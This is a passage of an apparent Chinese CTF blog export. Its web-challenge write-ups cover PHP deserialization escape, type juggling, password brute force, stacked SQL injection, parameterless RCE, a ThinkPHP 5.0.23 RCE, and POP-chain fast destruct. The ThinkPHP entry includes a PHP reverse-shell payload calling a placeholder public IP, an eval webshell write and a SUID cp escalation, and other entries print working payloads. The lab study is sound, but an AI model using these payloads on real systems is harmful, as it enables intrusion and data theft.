&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">filter</span>(<span class="params">$string</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">str_replace</span>(<span class="string">&#x27;Firebasky&#x27;</span>,<span class="string">&#x27;Firebaskyup&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=<span class="title function_">filter</span>(<span class="title function_">serialize</span>(<span class="keyword">new</span> <span class="title function_">a</span>($uname,$password)));</span><br><span class="line">$test=<span class="title function_">unserialize</span>($ser);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这里我们发现__wakeup()函数里才有获取到 flag 的函数，不能绕过，这里只有一个 GET 修改 uname，说明就是要在 serialize 里覆盖 password 来获取到 flag。<br>看到有一个 filter 函数会套在 serialize 函数外面，这种格式会导致序列化后字符个数不匹配，在反序列化过程中，他会按照字符个数去匹配参数内容，如果不匹配那么 wakeup 函数就会失效，该参数也会清空，这里每出现一个Firebasky就会多两个字符，这样的话就允许我们模仿序列化后的格式去定义 password 来覆盖掉后面的 password，构造 password 会多下面这一部分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125;&quot;</span><br></pre></td></tr></table></figure>
<p>这里记得用 <strong>;}”</strong> 来结束结构，让后面的 password 无效。<br>一共多了 30 个字符，刚好是偶数，我们在 uname 里填入 15 个Firebasky，多出来的 15 个 up 就刚刚好把这部分掩盖掉，故构造 payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?1=FirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebaskyFirebasky&quot;;s:8:&quot;password&quot;;s:5:&quot;yu22x&quot;;&#125; </span><br></pre></td></tr></table></figure>
<p>即可获得 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>字符逃逸</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】simplePHP PHP代码审计</title>
    <url>/2023/09/16/artical-simplephp/</url>
    <content><![CDATA[<h3 id="EASY-PHP漏洞"><a href="#EASY-PHP漏洞" class="headerlink" title="EASY　PHP漏洞"></a>EASY　PHP漏洞</h3><p>打开 simplephp 这道题我们拿到的信息。<br><img src="/2023/09/16/artical-simplephp/image_question.jpg"><br>首先是可以看到代码中有两个 GET，说明这道题可以通过构造 url GET请求来渗透。<br>代码中出现了”&#x3D;&#x3D;”，这个在 php 中是弱类型比较，弱类型比较与“&#x3D;&#x3D;&#x3D;”不同，不会要求他们格式也相同，而是会先将两个不同格式的变量转换为相同格式再比较，对于“$a&#x3D;&#x3D;0&amp;&amp;a”我们可以通过构造 0 的 url 编码来绕过，首先 GET 请求的时候会先一次解码，所以这里的 0 我们要二次编码，编码成%2530，然后在&#x3D;&#x3D;这里会转换成 0 通过，在判 a 为真这里也会通过，因为不会转换类型。<br>对于 b 的构造，要求其大于 1234，首先先来了解 php 中的各类型转换：<br>string -&gt; int，会扔掉除了 int 类型以外的所有符号，在 php 比较里面也是这样，比如拿字符串和 int 类型做比较，会导致字符串类型过滤掉除了 int 以外的，所以不能比较 ascii 码。<br>以此类推，会转换成被对比对象的格式，其他格式一律清除。<br>php 代码：<br><img src="/2023/09/16/artical-simplephp/image_code.jpg"><br>结果：<br><img src="/2023/09/16/artical-simplephp/image_result.jpg"><br>所以在这里，b 那边有个判断是否是数字类型的函数，我们需要绕过这个函数，所以必须是字符串形式，又要要求大于 1234，于是我们构造 b&#x3D;1235a （前面的数字比 1234 大）即可。<br>对于此题，我们构造：<br>&#x2F;?a&#x3D;a&#x3D;%2530&amp;&amp;b&#x3D;%34%34%34%34%41 即可获得 flag。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】weak_auth 密码爆破</title>
    <url>/2023/09/18/easy-blast/</url>
    <content><![CDATA[<h3 id="简单密码爆破"><a href="#简单密码爆破" class="headerlink" title="简单密码爆破"></a>简单密码爆破</h3><p>打开题目后，看到一个登录页面.<br><img src="/2023/09/18/easy-blast/image1.jpg"><br>我们先随机输入一些东西进去，看看效果：<br><img src="/2023/09/18/easy-blast/image2.jpg"><br>看到 login as admin，我们将用户名改为 admin 后，发现弹出窗口不一样。于是就锁定了用户名是 admin，然后对密码进行爆破。<br>使用 burp 进行爆破，选用爆破字典，更改参数：<br><img src="/2023/09/18/easy-blast/image3.jpg"><br><img src="/2023/09/18/easy-blast/image4.jpg"><br>进行爆破后我们发现，密码“123456”获取到的响应包的长度显著不同，点开查看后，发现已经成功登录并获取到 flag。<br><img src="/2023/09/18/easy-blast/image5.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】mysql 注入 1</title>
    <url>/2023/09/19/mysql-inject1/</url>
    <content><![CDATA[<h3 id="SQL注入-更改表"><a href="#SQL注入-更改表" class="headerlink" title="SQL注入-更改表"></a>SQL注入-更改表</h3><p>打开题目，我们看到：<br><img src="/2023/09/19/mysql-inject1/image1.jpg"><br>猜测是考察 sql 注入，我们输入1’查看是否有注入机会：<br><img src="/2023/09/19/mysql-inject1/image2.jpg"><br>可以看到成功执行了，所以我们要查看能在这个数据库中获取到什么信息，执行语句：<br>“1’;show tables #”<br>这里的用单引号将查询语句结束，并用#注释掉后面的引号防止报错，这里的 show databases 就会执行了。<br><img src="/2023/09/19/mysql-inject1/image3.jpg"><br>可以看到两个表，”1919810931114514”和“words”，我们先试一下能不能直接查询表，使用：<br>“1’;select * from `1919810931114514` # 发现：<br><img src="/2023/09/19/mysql-inject1/image4.jpg"><br>禁用了以上语句，那我们就要想办法怎么拿到信息了，我们看到窗口有一个功能，这个功能多半是查询语句构造1’ or 1&#x3D;1 #查询表内所有内容，没有发现 flag，说明不在这个表，这代表我们要替换表，构造：<br>“1’;show columns from `1919810931114514` #<br>发现了 flag：<br><img src="/2023/09/19/mysql-inject1/image5.jpg"><br>那说明这个查询语句默认在表 word 里，题目似乎没有禁用 rename 和 alter，我们采取更改预设表的形式来获取 flag，构造：<br>1’; rename tables `words` to `words1`; rename tables `1919810931114514` to `words`;<br>alter tables `words` change `flag` `id` varchar(100); #<br>去更改flag 在的表，并按照根据id 的格式去更改 flag，让查询语句对 flag 生效，更改后，构造：<br>1’ or 1&#x3D;1 #<br>查询所有内容即可获取到 flag。<br><img src="/2023/09/19/mysql-inject1/image6.jpg"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL 注入</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】 无参数 rce</title>
    <url>/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/</url>
    <content><![CDATA[<h1 id="【newstarctf】-R-C-E-无参数-RCE"><a href="#【newstarctf】-R-C-E-无参数-RCE" class="headerlink" title="【newstarctf】 R!!C!!E!!  无参数 RCE"></a>【newstarctf】 R!!C!!E!!  无参数 RCE</h1><p>打开靶机，提示我们再找信息，dirsearch一下发现有 git 泄露，url请求该 path 拿到 git 文件，放到 cyberchef 里解密看到有其他的 php 文件，打开后看到源代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>])) &#123; </span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]))&#123; </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;star&#x27;</span>]); </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很明显是一道 RCE 题，这边要绕正则，第一个正则是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;, &#x27;&#x27;, $_GET[&#x27;star&#x27;])</span><br></pre></td></tr></table></figure>

<p>这是一个很经典的无参正则，他可以匹配</p>
<ul>
<li>func();</li>
<li>func(func2());</li>
<li>func(func2(func3()));</li>
<li>func1(func2($_POST[a]));  这个自己发现的，没准什么时候能用上</li>
</ul>
<p>然后就导致后面 preg＿match 不能绕过，只能选 preg＿match 过滤以外的无参数 RCE。</p>
<p>注意到这里没有限制getallheaders(),getallheaders()是一个无参获取所有请求头内容的函数，返回请求头数组，然后 next 也没有禁用，经检查发现他没有验证请求头完整性，我们就删掉其他参数只剩下 next 能检测到的参数就能从 header 获取 RCE 内容了。</p>
<p>故构造 payload 为：</p>
<pre><code>?star=eval(next(getallheaders()));
</code></pre>
<p>请求头里将Cache-Control字段的值改为：</p>
<pre><code>system(&#39;cat /f*&#39;);
</code></pre>
<p>即可获取 flag</p>
<p><img src="/2023/10/14/newstarctf-%E6%97%A0%E5%8F%82%E6%95%B0-rce/result.jpg"></p>
<p>官方题解构造的 payload 是：</p>
<pre><code>?star=eval(pos(array_reverse(getallheaders())));
</code></pre>
<p>她们的思路是反转 header 数组再定位当前元素获取命令，命令放在请求头数组最后的元素上。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>RCE</tag>
        <tag>无参数绕过</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】Final thinkphp 漏洞与提权</title>
    <url>/2023/11/20/newstarctf2023-Final/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】Final-thinkphp-漏洞与提权"><a href="#【NewStarCTF2023】Final-thinkphp-漏洞与提权" class="headerlink" title="【NewStarCTF2023】Final thinkphp 漏洞与提权"></a>【NewStarCTF2023】Final thinkphp 漏洞与提权</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>打开靶机后, 是一个 thinkphp 的默认页面, 所以很有可能就是挖掘 thinkphp 的漏洞, 先在路径上输入一些默认参数查看其版本号.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image.png"></p>
<p>可以看到是 ThinkPHP V5.0.23.</p>
<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>去谷歌搜索 ThinkPHP V5.0.23 漏洞, 发现有 RCE 漏洞,用 POST 构造请求参数为 <code>/?s=captcha</code> 构造的 payload 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami</span><br></pre></td></tr></table></figure>

<p>这边的用法是 <code>filter[]</code> 参数中输入要执行的命令类型,<code>server[REQUEST_METHOD]</code> 里输入要执行命令的参数. </p>
<p>构造 payload 发送后没有回显, 说明很有可能把 system 给禁止了, 所以构造下面这个 payload 看看他的 phpinfo</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=phpinfo&amp;method=get&amp;server[REQUEST_METHOD]=5</span><br></pre></td></tr></table></figure>

<p>看到了他把 <code>system</code> 命令给禁用了:</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-2.png"></p>
<p>所以这里使用其他的命令去绕过, 比如 <code>exec</code>, <code>passthru</code></p>
<p>构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=ls /</span><br></pre></td></tr></table></figure>

<p>这样能够看到 ls 后的内容, 但是这里去 cat flag 的时候发现读不出来东西, 先弹个 shell, 构造 payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=passthru&amp;method=get&amp;server[REQUEST_METHOD]=php -r &#x27;$sock=fsockopen(&quot;公网ip&quot;, 监听端口);exec(&quot;sh &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br></pre></td></tr></table></figure>

<p>vps 上使用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">nc -lvnp 端口</span><br></pre></td></tr></table></figure>

<p>成功反弹 shell, 然后输入命令</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -la /</span><br></pre></td></tr></table></figure>

<p>发现 flag 文件设置了高权限可读, 所以这里要想办法提权获取到文件.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-3.png"></p>
<p>调用命令查看一下高权限的操作</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/2023/11/20/newstarctf2023-Final/image-4.png"></p>
<p>发现 <code>cp</code> 命令是高权限操作, 但是我在提权过程中发现由于 用户的权限太低, 环境变量用不了, 又不能使用 <code>sudo</code> 命令, 而且也查看不了定时任务, 根本没办法用反弹的 shell 进行提权.</p>
<p>由于 thinkphp 那个漏洞似乎是可以写入一句话木马的, 所以尝试去写入一句话木马, 把输出流绑定到木马文件上, 然后用蚁剑链接, 用 <code>cp</code>　命令把文件内容复制到输出流上提权读取文件, 构造 payload 为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_method=__construct&amp;filter[]=exec&amp;method=get&amp;server[REQUEST_METHOD]=echo &#x27;&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;&#x27; &gt; /var/www/public/shell.php</span><br></pre></td></tr></table></figure>

<p>然后以 <code>shell.php</code> 作为路径, <code>cmd</code>作为链接密码, 即可 getshell</p>
<p>然后在蚁剑命令终端中, 尝试用 <code>cp</code> 命令将文件内容复制到输出流 <code>/dev/stdout</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cp /flag_dd3f6380aa0d /dev/stdout</span><br></pre></td></tr></table></figure>

<p>最后获得 flag.</p>
<p><img src="/2023/11/20/newstarctf2023-Final/image-1.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>提权</tag>
        <tag>反弹 shell</tag>
        <tag>thinkphp</tag>
      </tags>
  </entry>
  <entry>
    <title>【newstarctf2023】Fast Destruct</title>
    <url>/2023/10/31/newstarctf2023-fast-destruct/</url>
    <content><![CDATA[<h1 id="【newstarctf】-More-Fast-pop-链构造"><a href="#【newstarctf】-More-Fast-pop-链构造" class="headerlink" title="【newstarctf】 More Fast pop 链构造"></a>【newstarctf】 More Fast pop 链构造</h1><h2 id="题目源码"><a href="#题目源码" class="headerlink" title="题目源码"></a>题目源码</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;errMsg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj-&gt;<span class="title function_ invoke__">evil</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;func)();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$this</span>-&gt;<span class="keyword">var</span>))&#123;</span><br><span class="line">            (<span class="variable language_">$this</span>-&gt;func)(<span class="variable language_">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Not Flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$wel</span> = <span class="variable language_">$this</span>-&gt;obj-&gt;good;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;NewStar&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Misc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">evil</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;good job but nothing&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;fast&#x27;</span>]);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Nope&quot;</span>); </span><br></pre></td></tr></table></figure>

<h2 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h2><p>看到题目，在 Web 这个类里面才能 RCE，也就是说最后的 POP<br> 链要在 Web 结束，往前推发现 Pwn 类里有 evil 说明是由 Pwn 类到 Web 类。</p>
<p> 触发 Pwn 类的__invoke()需要将 Pwn 类作为函数调用，可以看到Reverse类满足要求，所以是 Reverse 类到 Pwn 类。</p>
<p> Reverse类的 __get()方法需要访问一个不存在的属性，可以看到Crypto类满足条件，所以是Crypto类到 Reverse 类。</p>
<p> Crypto 类的__toString()在Start类的 die 函数中可以触发，说明是 Start 类到 Crypto 类。</p>
<p> 所以这道题的 POP 链构造为：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">Start::__destruct -&gt; Crypto::__toString -&gt; Reverse::__get -&gt; Pwn::__invoke -&gt; Web::evil</span><br></pre></td></tr></table></figure>

<p>POP链构造很容易，构造 POP 链的代码为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Start</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$errMsg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">       <span class="variable language_">$this</span>-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pwn</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Web</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$func</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var</span> = <span class="string">&quot;fla&#x27;&#x27;g&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Crypto</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$obj</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要是如何将 Start 类的 __destruct 作为入口触发。这里要介绍一下 fast destruct 技术：</p>
<ul>
<li>在 php 中，如果单独执行 unserialize 函数进行反序列化，那么反序列化后的对象的生命周期就会仅限于 unserialize 函数执行的生命周期，unserialize函数执行完毕，这个类就销毁了，此时就会调用 destruct。</li>
<li>如果将 unserialize 反序列化后的对象赋值给另一个变量，那么该对象的生命周期就会延长至该变量销毁为止。</li>
<li>unserialize 过程中是逐字读取的，他会先把读取到的内容分配内存空间，在结束的时候统一调用。</li>
</ul>
<p>以上三条意味着我们可以修改反序列化字符串的结构，当 unserialize 读到不正确的结构时会直接强制退出，这时 unserialize 执行结束，类销毁，会调用 destruct，对于已经分配好内存空间的类来说，就是提前调用了 destruct 。</p>
<p>fast destruct有两种方法：<br>序列化好后的结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>修改序列化数字元素个数(O:5 -&gt; O:6)：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:6:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>去掉序列化尾部 }:</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fla&#x27;&#x27;g&quot;;</span><br></pre></td></tr></table></figure>

<p>通过这两种方法均可拿到 flag：</p>
<p><img src="/2023/10/31/newstarctf2023-fast-destruct/pop.jpg"></p>
<h2 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解"></a>官方题解</h2><p>官方题解给出了一个基于 GC 垃圾回收机制的绕过，PHP中 有垃圾回收机制，当触发垃圾回收机制时，则会自动调用 destruct 函数，触发垃圾回收机制的方法有：</p>
<ul>
<li>源码中有 unset() 函数，可以直接销毁对象</li>
<li>当给对象赋值为 NULL 时，可以触发</li>
<li>当对象失去引用时，可以触发</li>
</ul>
<p>官方的题解中，通过修改下标的方式，让已经分配好内存的对象失去引用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">0</span>] = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$arr</span>[<span class="number">1</span>] = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:0&quot;</span>,<span class="string">&quot;i:1&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br></pre></td></tr></table></figure>

<p>结果为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;i:1;O:5:&quot;Start&quot;:1:&#123;s:6:&quot;errMsg&quot;;O:6:&quot;Crypto&quot;:1:&#123;s:3:&quot;obj&quot;;O:7:&quot;Reverse&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;Pwn&quot;:1:&#123;s:3:&quot;obj&quot;;O:3:&quot;Web&quot;:2:&#123;s:4:&quot;func&quot;;s:6:&quot;system&quot;;s:3:&quot;var&quot;;s:11:&quot;cat /fl&#x27;&#x27;ag&quot;;&#125;&#125;&#125;&#125;&#125;i:1;N;&#125;</span><br></pre></td></tr></table></figure>

<p>这里 i:1 在后面会再次声明，前面那个对象失去引用，所以就出发了 destruct，这种方式可以绕过抛出异常，应用范围更广一些。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>pop 链</tag>
      </tags>
  </entry>
  <entry>
    <title>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</title>
    <url>/2023/11/09/NewStarCTF2023-Include-pearcmd-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h1 id="【NewStarCTF2023】-Include🍐-pearcmd-文件包含"><a href="#【NewStarCTF2023】-Include🍐-pearcmd-文件包含" class="headerlink" title="【NewStarCTF2023】 Include🍐 pearcmd 文件包含"></a>【NewStarCTF2023】 Include🍐 pearcmd 文件包含</h1><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>进入靶机, 看到代码:</p>
